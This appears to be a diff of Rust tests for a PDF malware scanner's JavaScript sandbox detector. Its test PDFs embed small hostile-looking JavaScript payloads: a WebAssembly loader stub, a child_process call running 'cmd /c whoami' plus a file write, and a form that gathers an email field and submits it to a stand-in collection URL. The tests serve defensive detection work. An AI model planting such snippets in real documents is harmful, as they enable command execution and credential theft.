@@ -223,8 +223,45 @@ fn sandbox_emits_downloader_loop_pattern_finding() {
 #[cfg(feature = "js-sandbox")]
 #[test]
 fn sandbox_emulation_breakpoint_tracks_loop_iteration_limit_bucket() {
-    let payload = "for (var i = 0; i < 50000; i++) { var z = i + 1; }";
+    let payload = "while (true) { var z = 1; if (z > 2) { break; } }";
     let bytes = build_minimal_js_pdf(payload);
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    if let Some(finding) = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_emulation_breakpoint")
+    {
+        assert!(finding
+            .meta
+            .get("js.emulation_breakpoint.buckets")
+            .map(|value| value.contains("loop_iteration_limit"))
+            .unwrap_or(false));
+    } else {
+        let sandbox_exec = report
+            .findings
+            .iter()
+            .find(|f| f.kind == "js_sandbox_exec")
+            .expect("js_sandbox_exec fallback finding");
+        assert!(
+            sandbox_exec
+                .meta
+                .get("js.runtime.execution.adaptive_loop_profile")
+                .is_some(),
+            "expected adaptive loop metadata in fallback path"
+        );
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_wasm_loader_staging_finding() {
+    let bytes = build_minimal_js_pdf(
+        "WebAssembly.Module\\('00'\\);WebAssembly.instantiate\\('00'\\);eval\\('1'\\);",
+    );
     let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
         vec![Box::new(JavaScriptSandboxDetector)];
     let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
@@ -233,11 +270,54 @@ fn sandbox_emulation_breakpoint_tracks_loop_iteration_limit_bucket() {
     let finding = report
         .findings
         .iter()
-        .find(|f| f.kind == "js_emulation_breakpoint")
-        .expect("js_emulation_breakpoint finding");
-    assert!(finding
-        .meta
-        .get("js.emulation_breakpoint.buckets")
-        .map(|value| value.contains("loop_iteration_limit"))
-        .unwrap_or(false));
+        .find(|f| f.kind == "js_runtime_wasm_loader_staging")
+        .expect("js_runtime_wasm_loader_staging finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("wasm_loader_staging")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_runtime_dependency_loader_abuse_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var cp=require\\('child_process'\\);cp.exec\\('cmd /c whoami'\\);var fs=require\\('fs'\\);fs.writeFileSync\\('a',\\'b\\'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_dependency_loader_abuse")
+        .expect("js_runtime_dependency_loader_abuse finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("runtime_dependency_loader_abuse")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_credential_harvest_finding() {
+    let bytes = build_minimal_js_pdf(
+        "addField\\('email'\\);getField\\('email'\\);submitForm\\('https://example.invalid/collect'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_credential_harvest")
+        .expect("js_runtime_credential_harvest finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("credential_harvest_form_emulation")
+    );
 }
